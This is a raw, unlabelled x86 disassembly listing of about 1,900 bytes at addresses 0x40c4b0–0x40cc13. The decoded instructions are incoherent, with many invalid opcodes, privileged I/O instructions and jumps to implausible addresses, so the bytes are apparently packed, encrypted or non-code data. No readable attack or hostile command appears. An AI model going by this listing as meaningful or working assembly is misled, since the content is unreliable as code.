  40c4b0:	mov    al,0x26
  40c4b2:	test   DWORD PTR [edx+0x40],esp
  40c4b5:	ins    DWORD PTR es:[edi],dx
  40c4b6:	mov    edx,0x36c522e9
  40c4bb:	sbb    BYTE PTR [ebx],0x9f
  40c4be:	xchg   ecx,eax
  40c4bf:	std    
  40c4c0:	cs push eax
  40c4c2:	rcl    esp,1
  40c4c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4c5:	jecxz  0x40c4b7
  40c4c7:	xchg   edx,eax
  40c4c8:	jle    0x40c48c
  40c4ca:	push   edx
  40c4cb:	pop    eax
  40c4cc:	xchg   esi,eax
  40c4cd:	or     bh,0x75
  40c4d0:	dec    esp
  40c4d1:	div    DWORD PTR [eax+0x1c]
  40c4d4:	(bad)  
  40c4d5:	jae    0x40c46d
  40c4d7:	push   eax
  40c4d8:	cmp    eax,0x90d566f7
  40c4dd:	xlat   BYTE PTR ds:[ebx]
  40c4de:	rol    DWORD PTR [ebx+esi*4],cl
  40c4e1:	into   
  40c4e2:	das    
  40c4e3:	push   eax
  40c4e4:	xor    BYTE PTR ds:0xc30f230f,dl
  40c4ea:	mov    esp,0xf3df8e88
  40c4ef:	add    ah,bl
  40c4f1:	and    edi,eax
  40c4f3:	dec    esp
  40c4f4:	or     eax,0x38682c79
  40c4f9:	div    DWORD PTR [eax+0x4df0038d]
  40c4ff:	aam    0xf
  40c501:	shl    BYTE PTR [ebx-0xfc05d70],cl
  40c507:	ja     0x40c4df
  40c509:	mov    ecx,0x24f15899
  40c50e:	dec    esi
  40c50f:	addr16 push esi
  40c511:	xchg   ebp,eax
  40c512:	in     al,dx
  40c513:	mov    ds:0x36d82d6c,eax
  40c518:	jno    0x40c50b
  40c51a:	in     al,dx
  40c51b:	hlt    
  40c51c:	fistp  DWORD PTR ds:0xdbde910
  40c522:	mov    ch,0x51
  40c524:	loopne 0x40c583
  40c526:	jbe    0x40c4c2
  40c528:	std    
  40c529:	add    al,0x9f
  40c52b:	push   ecx
  40c52c:	push   ecx
  40c52d:	add    al,0x36
  40c52f:	(bad)  
  40c530:	sub    bl,ch
  40c532:	fidivr DWORD PTR [edi+0x2d]
  40c535:	mov    ecx,0x8ae5f73a
  40c53a:	std    
  40c53b:	jecxz  0x40c5b8
  40c53d:	enter  0x34b4,0x7e
  40c541:	sub    BYTE PTR [ecx+ebp*1+0x72],ch
  40c545:	mov    dl,0xcf
  40c547:	mov    eax,0x4e0baf
  40c54c:	mov    al,ds:0xc3ff0849
  40c551:	sbb    eax,0xd52492a8
  40c556:	sub    al,0x14
  40c558:	mov    ebp,0x8642d7ba
  40c55d:	xor    esi,DWORD PTR [ebp-0x494a105]
  40c563:	jle    0x40c586
  40c565:	mul    DWORD PTR ds:0x1fdb958b
  40c56b:	test   al,0xfd
  40c56d:	inc    eax
  40c56e:	int3   
  40c56f:	jle    0x40c5e0
  40c571:	shl    bh,0xec
  40c574:	icebp  
  40c575:	xor    BYTE PTR [ebp-0x2a62e573],ah
  40c57b:	mov    dl,0x29
  40c57d:	shl    BYTE PTR ds:0x9e1c65a6,0x81
  40c584:	push   ebp
  40c585:	xlat   BYTE PTR ds:[ebx]
  40c586:	mov    esi,0x9f2a9779
  40c58b:	icebp  
  40c58c:	inc    ebx
  40c58d:	aas    
  40c58e:	inc    edi
  40c58f:	retf   0x9a83
  40c592:	and    BYTE PTR [eax],dh
  40c594:	sbb    al,0x4
  40c596:	pop    edx
  40c597:	jp     0x40c5c2
  40c599:	xchg   BYTE PTR [edx+ecx*4],cl
  40c59c:	in     al,0x34
  40c59e:	mov    cs,WORD PTR [edi-0x74]
  40c5a1:	iret   
  40c5a2:	jno    0x40c558
  40c5a4:	out    0xf1,al
  40c5a6:	(bad)  
  40c5a7:	imul   esp,DWORD PTR [eax+0x71f3f29d],0x7
  40c5ae:	loop   0x40c5e1
  40c5b0:	jnp    0x40c604
  40c5b2:	jge    0x40c5ff
  40c5b4:	rol    DWORD PTR [esi+0x4a],1
  40c5b7:	(bad)  
  40c5b8:	shl    BYTE PTR [esi+edi*8+0xb],cl
  40c5bc:	dec    edi
  40c5bd:	adc    DWORD PTR [esi+0x4c99f664],edx
  40c5c3:	dec    edi
  40c5c4:	das    
  40c5c5:	pop    ebx
  40c5c6:	dec    esi
  40c5c7:	gs cmp al,0xac
  40c5ca:	ret    0xc5b3
  40c5cd:	pop    ds
  40c5ce:	arpl   WORD PTR [ecx+0x7],cx
  40c5d1:	push   edi
  40c5d2:	and    al,0x29
  40c5d4:	sbb    eax,esp
  40c5d6:	fidiv  WORD PTR [ecx]
  40c5d8:	ds ja  0x40c596
  40c5db:	fisub  DWORD PTR [edx]
  40c5dd:	sti    
  40c5de:	dec    esi
  40c5df:	adc    ch,BYTE PTR [edi]
  40c5e1:	enter  0xf7b3,0xbf
  40c5e5:	xchg   edx,eax
  40c5e6:	sub    BYTE PTR [edi+0x255b8266],bh
  40c5ec:	fldcw  WORD PTR [ebp+esi*2+0x6fa9a6d1]
  40c5f3:	sbb    edx,DWORD PTR [ebp-0x6f]
  40c5f6:	test   BYTE PTR [edi],al
  40c5f8:	ret    0x7321
  40c5fb:	jle    0x40c5a6
  40c5fd:	xchg   ebx,eax
  40c5fe:	adc    BYTE PTR [ebx-0x114cca43],dh
  40c604:	inc    esp
  40c605:	and    esp,DWORD PTR [esi+0x2a]
  40c608:	cmp    esp,DWORD PTR ds:[esi-0x19]
  40c60c:	dec    esi
  40c60d:	retf   0x5c7d
  40c610:	cmc    
  40c611:	adc    dh,BYTE PTR [edx+0x62]
  40c614:	jle    0x40c66e
  40c616:	std    
  40c617:	dec    edi
  40c618:	out    0x3c,eax
  40c61a:	cmp    BYTE PTR [eax-0x6a515a45],cl
  40c620:	sar    bl,1
  40c622:	mov    ch,BYTE PTR [edx+0x5ee9443b]
  40c628:	sbb    al,0xd6
  40c62a:	ret    
  40c62b:	imul   eax,eax,0x3e6dd5ac
  40c631:	cmp    edx,ebx
  40c633:	ds dec edi
  40c635:	clc    
  40c636:	mov    ds:0x1a131607,al
  40c63b:	and    bl,dl
  40c63d:	fiadd  WORD PTR [edx-0x7043e604]
  40c643:	sbb    eax,0x163fcc94
  40c648:	shl    ebp,cl
  40c64a:	inc    esi
  40c64b:	dec    eax
  40c64c:	push   esp
  40c64d:	jb     0x40c60a
  40c64f:	add    BYTE PTR [ebp+0x424880e4],ah
  40c655:	mov    bl,BYTE PTR [ebx]
  40c657:	adc    eax,0x791f8008
  40c65c:	lods   eax,DWORD PTR ds:[esi]
  40c65d:	aad    0x80
  40c65f:	adc    ebx,DWORD PTR [esi+0x3b]
  40c662:	bound  esp,QWORD PTR [eax]
  40c664:	arpl   WORD PTR [ebx+0xd],bx
  40c667:	mov    ebp,0x9431c971
  40c66c:	lock cli 
  40c66e:	cmc    
  40c66f:	aaa    
  40c670:	mov    ecx,0x83da3128
  40c675:	mov    DWORD PTR [eiz*4-0x1fb2e68b],ecx
  40c67c:	cdq    
  40c67d:	mov    eax,ds:0x5959f0b0
  40c682:	adc    cl,BYTE PTR [ebx-0x39]
  40c685:	push   ds
  40c686:	xchg   esp,eax
  40c687:	stos   BYTE PTR es:[edi],al
  40c688:	adc    DWORD PTR [ecx+ecx*4+0xa97a338],edx
  40c68f:	jg     0x40c66d
  40c691:	call   0x209c98da
  40c696:	adc    eax,ebx
  40c698:	out    0x3c,al
  40c69a:	data16 xlat BYTE PTR ds:[ebx]
  40c69c:	mov    ch,dh
  40c69e:	das    
  40c69f:	sbb    DWORD PTR [esi+ecx*1-0x4bc61664],ebx
  40c6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a7:	cwde   
  40c6a8:	(bad)  
  40c6aa:	and    dl,BYTE PTR [esp+eiz*2]
  40c6ad:	jb     0x40c671
  40c6af:	(bad)  [ebp+0x76]
  40c6b2:	retf   0xfe42
  40c6b5:	jbe    0x40c66b
  40c6b7:	(bad)  [ebx-0x48eea152]
  40c6bd:	ss sti 
  40c6bf:	scas   eax,DWORD PTR es:[edi]
  40c6c0:	int3   
  40c6c1:	sbb    ebp,edx
  40c6c3:	xchg   ecx,eax
  40c6c4:	add    DWORD PTR [ecx-0x7a63d594],ebp
  40c6ca:	adc    dh,BYTE PTR [eax]
  40c6cc:	or     eax,0x119ca503
  40c6d1:	dec    esp
  40c6d2:	mov    eax,ds:0x70199dc8
  40c6d7:	push   cs
  40c6d8:	not    DWORD PTR [eax]
  40c6da:	jnp    0x40c6cb
  40c6dc:	lahf   
  40c6dd:	mov    eax,ds:0xd19aad22
  40c6e2:	lock push ss
  40c6e4:	sub    esi,DWORD PTR [ebx+0x5c72a476]
  40c6ea:	(bad)  
  40c6eb:	jp     0x40c68f
  40c6ed:	ds push cs
  40c6ef:	push   edx
  40c6f0:	inc    esp
  40c6f1:	std    
  40c6f2:	xor    BYTE PTR [ecx+0x39],bl
  40c6f5:	aad    0x41
  40c6f7:	inc    eax
  40c6f8:	call   0xfa9cc46e
  40c6fd:	adc    al,0x84
  40c6ff:	jmp    0xfe7e:0x5ec7f4c1
  40c706:	ficomp WORD PTR [ecx+ebx*2]
  40c709:	pop    ecx
  40c70a:	cmp    DWORD PTR [eax+0x46],esp
  40c70d:	fdivr  st(7),st
  40c70f:	mov    esi,0xd56a6b02
  40c714:	fs and al,0x9b
  40c717:	scas   eax,DWORD PTR es:[edi]
  40c718:	inc    ebx
  40c719:	push   ebp
  40c71a:	dec    eax
  40c71b:	xchg   ecx,eax
  40c71c:	mov    ds:0xab4043fd,al
  40c721:	mov    al,ds:0x5cb15cc2
  40c726:	call   0x2181ce93
  40c72b:	jno    0x40c6c2
  40c72d:	out    dx,al
  40c72e:	lea    edi,[ebx-0x57]
  40c731:	xor    cl,ah
  40c733:	cdq    
  40c734:	push   ebx
  40c735:	mov    bl,0x69
  40c737:	sahf   
  40c738:	mov    ds:0x8cc706e8,eax
  40c73d:	fs pop es
  40c73f:	xchg   esp,eax
  40c740:	dec    ebx
  40c741:	addr16 inc esp
  40c743:	inc    esp
  40c744:	inc    eax
  40c745:	adc    DWORD PTR [esi+esi*4-0x1],0x9bcd4273
  40c74d:	(bad)  
  40c74e:	rcl    DWORD PTR [ecx+0x1],1
  40c751:	sbb    DWORD PTR [eax+0x75],ebx
  40c754:	push   ebx
  40c755:	jns    0x40c77e
  40c757:	lods   al,BYTE PTR ds:[esi]
  40c758:	enter  0xd350,0xca
  40c75c:	aaa    
  40c75d:	sub    DWORD PTR [ebx+ecx*4-0x2c],esp
  40c761:	nop
  40c762:	lods   al,BYTE PTR ds:[esi]
  40c763:	xchg   edx,eax
  40c764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c765:	sub    BYTE PTR [edi],dl
  40c767:	pop    ds
  40c768:	nop
  40c769:	or     al,0xc2
  40c76b:	pusha  
  40c76c:	sbb    DWORD PTR [ecx],0x3
  40c76f:	cli    
  40c770:	fisubr DWORD PTR [edi+0x58]
  40c773:	jle    0x40c7d4
  40c775:	daa    
  40c776:	push   0x5ae48cfa
  40c77b:	jbe    0x40c7d4
  40c77d:	pushf  
  40c77e:	and    al,0x83
  40c780:	outs   dx,BYTE PTR ds:[esi]
  40c781:	lahf   
  40c782:	cld    
  40c783:	nop
  40c784:	mul    DWORD PTR [bx+di+0x47aa]
  40c789:	jno    0x40c7db
  40c78b:	test   al,0x42
  40c78d:	add    ch,dh
  40c78f:	adc    DWORD PTR [esi-0x3d],0xbfcb05a3
  40c796:	lods   al,BYTE PTR ss:[esi]
  40c798:	jp     0x40c754
  40c79a:	imul   ebp,DWORD PTR [ebx],0xd781517a
  40c7a0:	push   edx
  40c7a1:	mov    esi,0xf1d8cc3f
  40c7a7:	ret    0xb367
  40c7aa:	cmp    cl,BYTE PTR es:0xe67e306f
  40c7b1:	add    DWORD PTR [esi+0x2aa9e4c5],ebp
  40c7b7:	addr16 addr16 (bad) 
  40c7ba:	mov    dh,0x3d
  40c7bc:	lahf   
  40c7bd:	mov    al,ds:0x519b6aad
  40c7c2:	mov    ebx,0x6b6a364e
  40c7c7:	ret    
  40c7c8:	mov    dl,0xf8
  40c7ca:	and    eax,0x14c65202
  40c7cf:	fisubr WORD PTR [ecx]
  40c7d1:	xchg   ebp,eax
  40c7d2:	jecxz  0x40c80d
  40c7d4:	xchg   ebx,eax
  40c7d5:	push   eax
  40c7d6:	or     DWORD PTR [esi+0x54e03684],0x7b
  40c7dd:	lahf   
  40c7de:	aas    
  40c7df:	mov    ebp,0x965421f2
  40c7e4:	jae    0x40c7de
  40c7e6:	pop    es
  40c7e7:	ins    DWORD PTR es:[edi],dx
  40c7e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7e9:	test   DWORD PTR [ebx+0x13abe922],eax
  40c7ef:	call   0x5800:0x2cb5cd4f
  40c7f6:	repz dec eax
  40c7f8:	dec    edx
  40c7f9:	hlt    
  40c7fa:	popa   
  40c7fb:	and    DWORD PTR [edi+0x66fe2f62],esi
  40c801:	addr16 je 0x40c84a
  40c804:	mov    eax,ds:0x82599a5c
  40c809:	enter  0x5f5c,0xa1
  40c80d:	jmp    FWORD PTR [ebx+0x26]
  40c810:	push   esi
  40c811:	xor    bl,bl
  40c813:	inc    eax
  40c814:	mov    ebp,DWORD PTR [ebp+0x6b]
  40c817:	sbb    DWORD PTR [esi],0x60
  40c81a:	aad    0x9c
  40c81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c81d:	mov    fs,WORD PTR [eax]
  40c81f:	int3   
  40c820:	push   esi
  40c821:	cmp    BYTE PTR [ebx-0x10230ea6],ch
  40c827:	scas   al,BYTE PTR es:[edi]
  40c828:	jge    0x40c7cb
  40c82a:	aad    0xf7
  40c82c:	stos   DWORD PTR es:[edi],eax
  40c82d:	pop    ds
  40c82e:	stc    
  40c82f:	gs das 
  40c831:	repz dec eax
  40c833:	cld    
  40c834:	jp     0x40c827
  40c836:	cmc    
  40c837:	xor    BYTE PTR [esp+ebx*4+0x5],bl
  40c83b:	pusha  
  40c83c:	out    0x8d,eax
  40c83e:	arpl   WORD PTR [ebx+0x4afd208d],dx
  40c844:	sar    BYTE PTR [edx+ecx*8],1
  40c847:	ds push edi
  40c849:	xor    al,0x48
  40c84b:	clc    
  40c84c:	and    al,0xbe
  40c84e:	(bad)  
  40c84f:	data16 jnp 0x40c8ba
  40c852:	xor    BYTE PTR [edi],bh
  40c854:	dec    eax
  40c855:	enter  0xc2f6,0x2d
  40c859:	and    dh,cl
  40c85b:	test   BYTE PTR [edi+0x4394bd38],cl
  40c861:	jns    0x40c81c
  40c863:	push   ss
  40c864:	mov    ecx,ebp
  40c866:	or     al,0x74
  40c868:	fnstcw WORD PTR [edi+0x1be4887e]
  40c86e:	test   al,0x21
  40c870:	push   es
  40c871:	(bad)  
  40c872:	sti    
  40c873:	add    eax,0xecd1d592
  40c878:	jge    0x40c80b
  40c87a:	(bad)  
  40c87b:	mov    al,ds:0xc6115534
  40c880:	mov    esp,0x74b1afa6
  40c885:	jmp    0xecafcaa6
  40c88a:	and    bl,BYTE PTR [ecx-0x1f1fcffc]
  40c890:	pop    ds
  40c891:	std    
  40c892:	lods   al,BYTE PTR ds:[esi]
  40c893:	dec    ebp
  40c894:	shr    edi,0x49
  40c897:	jae    0x40c8ad
  40c899:	sbb    al,0xc5
  40c89b:	jnp    0x40c836
  40c89d:	dec    edx
  40c89e:	inc    esp
  40c89f:	xor    al,0xfa
  40c8a1:	sub    dh,bl
  40c8a3:	jge    0x40c8a9
  40c8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a6:	loopne 0x40c8a3
  40c8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8a9:	cmp    DWORD PTR [eax+edx*2+0x2f],esp
  40c8ad:	call   0xaeeae4ab
  40c8b2:	lods   eax,DWORD PTR ds:[esi]
  40c8b3:	inc    edi
  40c8b4:	push   eax
  40c8b5:	push   ss
  40c8b6:	dec    ebx
  40c8b7:	fwait
  40c8b8:	(bad)  
  40c8b9:	sahf   
  40c8ba:	mul    DWORD PTR [edx+edi*4-0x9]
  40c8be:	aaa    
  40c8bf:	into   
  40c8c0:	in     al,dx
  40c8c1:	xchg   edi,eax
  40c8c2:	pop    ebx
  40c8c3:	and    BYTE PTR [ebx-0x4e9b3f34],ch
  40c8c9:	xor    edx,DWORD PTR [edx-0x2115558b]
  40c8cf:	paddq  mm1,mm6
  40c8d2:	mov    ecx,0x1c505563
  40c8d7:	mov    esp,esi
  40c8d9:	xor    BYTE PTR [ebx],cl
  40c8db:	(bad)  
  40c8dd:	dec    BYTE PTR [eax-0x1]
  40c8e0:	cmp    al,0x68
  40c8e2:	inc    edx
  40c8e3:	and    edi,DWORD PTR [edx-0x42]
  40c8e6:	lock int 0x67
  40c8e9:	jge    0x40c880
  40c8eb:	arpl   si,di
  40c8ed:	into   
  40c8ee:	adc    esi,ecx
  40c8f0:	xchg   DWORD PTR [ebp-0x77],edx
  40c8f3:	rcl    bl,1
  40c8f5:	dec    ebp
  40c8f6:	leave  
  40c8f7:	sub    ah,dl
  40c8f9:	imul   ebp,DWORD PTR [esi+0x5d],0x29978cb3
  40c900:	(bad)  
  40c901:	ss out dx,eax
  40c903:	jge    0x40c967
  40c905:	pusha  
  40c906:	push   0xfffffffe
  40c908:	or     DWORD PTR [edi-0x34923095],0x2d886122
  40c912:	out    0x96,al
  40c914:	mov    dl,0x41
  40c916:	test   BYTE PTR [edi-0x459b09a5],dh
  40c91c:	fwait
  40c91d:	inc    ebp
  40c91e:	pop    eax
  40c91f:	ret    0x7e9d
  40c922:	add    BYTE PTR [eax+0x51699702],cl
  40c928:	rol    BYTE PTR [edx+0x5d],cl
  40c92b:	cmp    BYTE PTR [edi-0x73],al
  40c92e:	or     esi,DWORD PTR [edx-0x56]
  40c931:	rcr    ebp,cl
  40c933:	inc    ecx
  40c934:	loopne 0x40c8fc
  40c936:	xor    cl,BYTE PTR [ecx]
  40c938:	addr16 iret 
  40c93a:	jmp    0xedac9cbf
  40c93f:	sti    
  40c940:	ins    BYTE PTR es:[edi],dx
  40c941:	popf   
  40c942:	arpl   WORD PTR [esi+0x71],si
  40c945:	cmp    BYTE PTR [ebx+0x67],ch
  40c948:	imul   esi,DWORD PTR [edi+ecx*2],0x15
  40c94c:	jl     0x40c964
  40c94e:	repz xor cl,bh
  40c951:	retf   
  40c952:	in     eax,dx
  40c953:	pop    esi
  40c954:	(bad)  
  40c955:	jne    0x40c8e2
  40c957:	push   0xb8c80b80
  40c95c:	imul   esi,DWORD PTR [edi-0x1950a870],0x3f
  40c963:	fild   QWORD PTR [ecx]
  40c965:	lds    ecx,FWORD PTR [ebx]
  40c967:	popa   
  40c968:	xchg   BYTE PTR [eax+0x2d],cl
  40c96b:	jo     0x40c91a
  40c96d:	nop
  40c96e:	xchg   DWORD PTR [ecx-0x5f],edx
  40c971:	inc    ecx
  40c972:	jne    0x40c9b8
  40c974:	pop    ss
  40c975:	xor    ah,BYTE PTR [edx]
  40c977:	mov    ah,0x23
  40c979:	nop
  40c97a:	jmp    0x40c973
  40c97c:	pop    esi
  40c97d:	adc    al,0x26
  40c97f:	fsubrp st(7),st
  40c981:	scas   eax,DWORD PTR es:[edi]
  40c982:	ja     0x40c9af
  40c984:	std    
  40c985:	and    al,0xbd
  40c987:	xor    bh,dh
  40c989:	es sbb eax,0x6c842495
  40c98f:	mov    dh,0x1
  40c991:	hlt    
  40c992:	mov    ds:0x7ef9bfac,eax
  40c997:	sti    
  40c998:	mov    edi,0x773597e6
  40c99d:	cdq    
  40c99e:	in     al,dx
  40c99f:	gs dec esp
  40c9a1:	clc    
  40c9a2:	ins    DWORD PTR es:[edi],dx
  40c9a3:	outs   dx,DWORD PTR ds:[esi]
  40c9a4:	(bad)  
  40c9a5:	and    DWORD PTR [edi],edi
  40c9a7:	mov    edi,0x258423ed
  40c9ac:	push   0x30
  40c9ae:	fcomp  DWORD PTR [edi-0x5c7d41ab]
  40c9b4:	(bad)  
  40c9b6:	push   ebx
  40c9b7:	lods   eax,DWORD PTR ds:[esi]
  40c9b8:	std    
  40c9b9:	outs   dx,DWORD PTR ds:[esi]
  40c9ba:	xchg   esi,eax
  40c9bb:	cs cmc 
  40c9bd:	cmp    DWORD PTR [esi+0x251bbbd1],ebx
  40c9c3:	push   ebp
  40c9c4:	add    BYTE PTR [ebp+0x191a8889],bl
  40c9ca:	jmp    0x2d2f07da
  40c9cf:	and    BYTE PTR [edx],bh
  40c9d1:	into   
  40c9d2:	sbb    eax,0x76114433
  40c9d7:	pop    edi
  40c9d8:	xchg   edx,eax
  40c9d9:	sahf   
  40c9da:	stos   DWORD PTR es:[edi],eax
  40c9db:	mov    ch,0xce
  40c9dd:	scas   eax,DWORD PTR es:[edi]
  40c9de:	sbb    dl,BYTE PTR [esi-0x460a0dcd]
  40c9e4:	daa    
  40c9e5:	fnstcw WORD PTR [edi+0x3737dcf3]
  40c9eb:	mov    esi,cs
  40c9ed:	mov    edi,DWORD PTR [edx+0x39]
  40c9f0:	ja     0x40c9b5
  40c9f2:	mov    eax,ds:0xeefdd5e1
  40c9f7:	out    0x40,al
  40c9f9:	xor    BYTE PTR [ebx-0x4c742903],bh
  40c9ff:	cli    
  40ca00:	mov    al,0xac
  40ca02:	sti    
  40ca03:	pop    edi
  40ca04:	pop    eax
  40ca05:	pusha  
  40ca06:	push   cs
  40ca07:	sbb    DWORD PTR [ebx],ecx
  40ca09:	(bad)  
  40ca0a:	clc    
  40ca0b:	pop    ss
  40ca0c:	loop   0x40ca60
  40ca0e:	add    ebx,ecx
  40ca10:	push   edx
  40ca11:	sub    DWORD PTR [edx-0x392934e9],edx
  40ca17:	xor    BYTE PTR [ecx-0x6f4643c4],al
  40ca1d:	xchg   ebx,eax
  40ca1e:	adc    al,0xa2
  40ca20:	mov    ds:0xd5a473b0,al
  40ca25:	out    dx,al
  40ca26:	jg     0x40ca2d
  40ca28:	or     DWORD PTR [edi+0x44],edi
  40ca2b:	leave  
  40ca2c:	popa   
  40ca2d:	add    edx,ebx
  40ca2f:	leave  
  40ca30:	sub    eax,DWORD PTR [esi+0x7]
  40ca33:	cmp    edx,edi
  40ca35:	cwde   
  40ca36:	test   ebx,esi
  40ca38:	(bad)  
  40ca39:	daa    
  40ca3a:	adc    BYTE PTR [eax],dl
  40ca3c:	cli    
  40ca3d:	out    dx,al
  40ca3e:	dec    esp
  40ca3f:	pop    esp
  40ca40:	inc    ecx
  40ca41:	adc    al,0x2e
  40ca43:	mov    al,ds:0xd48e8ac2
  40ca48:	out    dx,al
  40ca49:	and    eax,0x4e0d7b74
  40ca4e:	imul   esp,esp,0x14ec56ed
  40ca54:	xchg   esp,eax
  40ca55:	lahf   
  40ca56:	dec    eax
  40ca57:	aad    0x22
  40ca59:	jge    0x40c9e7
  40ca5b:	ret    
  40ca5c:	pop    eax
  40ca5d:	jmp    0x40ca51
  40ca5f:	fist   WORD PTR [edi]
  40ca61:	aas    
  40ca62:	fist   WORD PTR [ebx+0x4]
  40ca65:	ins    BYTE PTR es:[edi],dx
  40ca66:	wrmsr  
  40ca68:	mov    DWORD PTR ds:0x9ecd1fd8,esi
  40ca6e:	jno    0x40ca88
  40ca70:	mov    esp,0xdfa07438
  40ca75:	add    DWORD PTR [ebx],ebx
  40ca77:	mov    DWORD PTR [ebx-0x263becfc],edx
  40ca7d:	inc    esi
  40ca7e:	adc    ecx,DWORD PTR [ebp-0x39]
  40ca81:	sbb    BYTE PTR [esi-0x49916774],bh
  40ca87:	jae    0x40ca72
  40ca89:	retf   
  40ca8a:	mul    BYTE PTR [ecx-0x4d]
  40ca8d:	sub    ecx,ecx
  40ca8f:	mov    ah,0x86
  40ca91:	adc    edi,DWORD PTR [edi+0x57]
  40ca94:	clc    
  40ca95:	jg     0x40ca5b
  40ca97:	inc    ebp
  40ca98:	mov    edx,0xcf85c89
  40ca9d:	shl    eax,1
  40ca9f:	mov    cl,BYTE PTR [esi+0x3d20b971]
  40caa5:	retf   
  40caa6:	ror    al,1
  40caa8:	es ja  0x40cb21
  40caab:	xor    DWORD PTR [edi+0x79],0x9d15b0c4
  40cab2:	fs dec edx
  40cab4:	pop    esp
  40cab5:	lea    edi,[eax*1+0x342cf628]
  40cabc:	int3   
  40cabd:	dec    edi
  40cabe:	push   0x4c0ddc65
  40cac3:	add    al,0x95
  40cac5:	pusha  
  40cac6:	aad    0xd7
  40cac8:	in     al,0x87
  40caca:	test   DWORD PTR [ecx+edx*1],edi
  40cacd:	mov    ebx,0xefbed0a5
  40cad2:	rol    bh,0xc8
  40cad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad7:	push   cs
  40cad8:	es icebp 
  40cada:	mov    ah,0x4d
  40cadc:	adc    ebp,DWORD PTR [esi+0x2d]
  40cadf:	lds    eax,FWORD PTR [edi+0x3e]
  40cae2:	ror    DWORD PTR [edi+0x63],cl
  40cae5:	not    BYTE PTR [ecx-0x12]
  40cae8:	inc    ecx
  40cae9:	lahf   
  40caea:	sub    eax,0xdb069a9b
  40caef:	inc    ebp
  40caf0:	mov    bl,0x6c
  40caf2:	mov    dh,0xc1
  40caf4:	retf   
  40caf5:	sahf   
  40caf6:	and    BYTE PTR [ecx-0x6d81ea61],cl
  40cafc:	dec    ecx
  40cafd:	fisub  DWORD PTR [edi+0x47]
  40cb00:	in     al,0x46
  40cb02:	icebp  
  40cb03:	inc    edi
  40cb04:	jno    0x40cad6
  40cb06:	sbb    DWORD PTR [ebp-0x281b78df],edi
  40cb0c:	gs ret 
  40cb0e:	pop    es
  40cb0f:	loopne 0x40cb2a
  40cb11:	xchg   DWORD PTR [esi+0x334e1d8c],edx
  40cb17:	push   ss
  40cb18:	or     ebp,esi
  40cb1a:	bound  edx,QWORD PTR [ebx-0xb90785a]
  40cb20:	add    cl,bl
  40cb22:	and    BYTE PTR [esi+0x3558bc26],al
  40cb28:	or     ecx,DWORD PTR [edx-0x50c09e3c]
  40cb2e:	ret    0x3f9d
  40cb31:	ins    BYTE PTR es:[edi],dx
  40cb32:	imul   ecx,ecx,0x607dd492
  40cb38:	jmp    0xe1f86194
  40cb3d:	jmp    0xb491:0x3887da36
  40cb44:	mov    eax,ds:0x1143b13f
  40cb49:	jns    0x40cbbd
  40cb4b:	sbb    al,0x6b
  40cb4d:	mov    edi,0x42678c6e
  40cb52:	inc    edx
  40cb53:	mov    eax,ds:0x45c973e8
  40cb58:	mov    cs,WORD PTR [esi+0x4755ed28]
  40cb5e:	pop    eax
  40cb5f:	and    DWORD PTR [eax],eax
  40cb61:	fist   DWORD PTR [eax]
  40cb63:	dec    esp
  40cb64:	and    BYTE PTR [eax],0x52
  40cb67:	aad    0x3d
  40cb69:	dec    ebp
  40cb6a:	mov    eax,0x60eff3b
  40cb6f:	mov    bl,0x17
  40cb71:	mov    ch,0x10
  40cb73:	idiv   DWORD PTR [edi+0x43]
  40cb76:	mov    ebp,0xf58f63f7
  40cb7b:	dec    ebx
  40cb7c:	xchg   esi,eax
  40cb7d:	push   esp
  40cb7e:	nop
  40cb7f:	push   eax
  40cb80:	jle    0x40cb60
  40cb82:	add    al,0xc3
  40cb84:	hlt    
  40cb85:	cwde   
  40cb86:	ins    DWORD PTR es:[edi],dx
  40cb87:	or     eax,0x460b1d1b
  40cb8c:	xor    dh,al
  40cb8e:	(bad)  
  40cb8f:	adc    eax,0x104e069f
  40cb94:	add    ah,bl
  40cb96:	mov    esi,0x18d8025
  40cb9b:	push   edx
  40cb9c:	push   es
  40cb9d:	aad    0xe8
  40cb9f:	adc    al,al
  40cba1:	dec    edx
  40cba2:	dec    edx
  40cba3:	cmp    al,ah
  40cba5:	lahf   
  40cba6:	or     BYTE PTR [ebp*1+0x5bfa4389],al
  40cbad:	add    BYTE PTR [ebp+0x62],ch
  40cbb0:	mov    WORD PTR [eax],es
  40cbb2:	add    ebp,0xffffffeb
  40cbb5:	daa    
  40cbb6:	jb     0x40cb43
  40cbb8:	push   0x2e0f87c7
  40cbbd:	dec    edx
  40cbbe:	stc    
  40cbbf:	add    eax,DWORD PTR [esi+0x66]
  40cbc2:	inc    ebx
  40cbc3:	and    al,dh
  40cbc5:	ins    BYTE PTR es:[edi],dx
  40cbc6:	push   esi
  40cbc7:	loope  0x40cbfa
  40cbc9:	pop    ebp
  40cbca:	push   edi
  40cbcb:	mov    cs,eax
  40cbcd:	push   edx
  40cbce:	dec    edx
  40cbcf:	cmp    ebp,ebx
  40cbd1:	pop    eax
  40cbd2:	(bad)  [eax-0x27a12da8]
  40cbd8:	xor    DWORD PTR [ebp-0x39bb5987],ecx
  40cbde:	repnz or esp,esp
  40cbe1:	or     BYTE PTR [eax+edx*4],0x97
  40cbe5:	iret   
  40cbe6:	das    
  40cbe7:	cmp    DWORD PTR [ebx+ebx*1-0x4e],edi
  40cbeb:	or     bl,BYTE PTR [esi]
  40cbed:	shl    BYTE PTR [edi],cl
  40cbef:	sbb    BYTE PTR [edi+0x2e],bl
  40cbf2:	jle    0x40cc37
  40cbf4:	jb     0x40cc57
  40cbf6:	pop    esp
  40cbf7:	add    DWORD PTR [eax-0x781edc4e],esp
  40cbfd:	out    0x14,eax
  40cbff:	cli    
  40cc00:	dec    ecx
  40cc01:	outs   dx,BYTE PTR ds:[esi]
  40cc02:	dec    edi
  40cc03:	push   esi
  40cc04:	jge    0x40cc82
  40cc06:	mov    eax,ds:0x59abab1c
  40cc0b:	addr16 push ebx
  40cc0d:	lock (bad) 
  40cc10:	xchg   edx,eax
  40cc11:	mov    ebx,DWORD PTR [esi]
  40cc13:	test   eax,esp
